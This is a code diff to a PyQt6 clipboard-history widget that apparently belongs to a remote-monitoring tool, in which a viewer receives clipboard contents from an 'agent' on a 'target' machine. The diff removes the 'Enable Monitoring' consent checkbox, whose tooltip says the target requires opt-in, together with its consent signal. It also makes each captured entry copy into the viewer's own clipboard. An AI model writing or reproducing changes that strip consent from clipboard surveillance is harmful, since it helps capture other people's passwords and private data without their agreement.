@@ -4,10 +4,10 @@ Clipboard Tab Widget - View clipboard history and sync with agent
 from PyQt6.QtWidgets import (
     QWidget, QVBoxLayout, QHBoxLayout, QPlainTextEdit, 
     QPushButton, QLabel, QScrollArea, QFrame, QDialog,
-    QSizePolicy, QCheckBox
+    QSizePolicy
 )
 from PyQt6.QtCore import pyqtSignal
-from PyQt6.QtGui import QFont, QGuiApplication, QFontDatabase
+from PyQt6.QtGui import QGuiApplication, QFontDatabase
 
 
 class ClipboardDetailDialog(QDialog):
@@ -194,10 +194,9 @@ class ClipboardTab(QWidget):
     """Clipboard history widget."""
     
     get_clipboard_signal = pyqtSignal()  # Request current clipboard
-    set_clipboard_signal = pyqtSignal(str)  # Set remote clipboard
+
     get_history_signal = pyqtSignal()  # Request clipboard history
     delete_entry_signal = pyqtSignal(int)  # Delete entry by index
-    set_consent_signal = pyqtSignal(bool) # Enable/Disable monitoring
     
     def __init__(self, parent=None):
         super().__init__(parent)
@@ -213,13 +212,6 @@ class ClipboardTab(QWidget):
         title = QLabel("📋 Clipboard History")
         title.setStyleSheet("font-size: 14px; font-weight: bold; color: #d4d4d4;")
         title_layout.addWidget(title)
-        
-        # Privacy Toggle
-        self.consent_check = QCheckBox("Enable Monitoring")
-        self.consent_check.setToolTip("Must be enabled to receive clipboard updates (Target requires opt-in)")
-        self.consent_check.setStyleSheet("color: #d4d4d4;")
-        self.consent_check.toggled.connect(self.set_consent_signal.emit)
-        title_layout.addWidget(self.consent_check)
         
         self.count_label = QLabel("(0 entries)")
         self.count_label.setStyleSheet("color: #888; font-size: 12px;")
@@ -296,11 +288,17 @@ class ClipboardTab(QWidget):
         self.rebuild_history_ui()
     
     def add_entry(self, entry):
-        """Add new real-time clipboard entry.
-        
-        Args:
-            entry: dict with 'text' and 'timestamp' keys
-        """
+        """Add new real-time clipboard entry and update local clipboard."""
+        # Update local clipboard (Viewer side)
+        text = entry.get('text', '')
+        if text:
+            # Prevent loop? Agent->Viewer (Here) -> Viewer (System) -> Viewer Monitor (None) -> Agent
+            # Viewer doesn't have a monitor, so this is safe.
+            try:
+                QGuiApplication.clipboard().setText(text)
+            except Exception as e:
+                print(f"[-] Viewer Clipboard Set Error: {e}")
+
         # Add to front of history (newest first)
         self.history.append(entry)
         self.rebuild_history_ui()
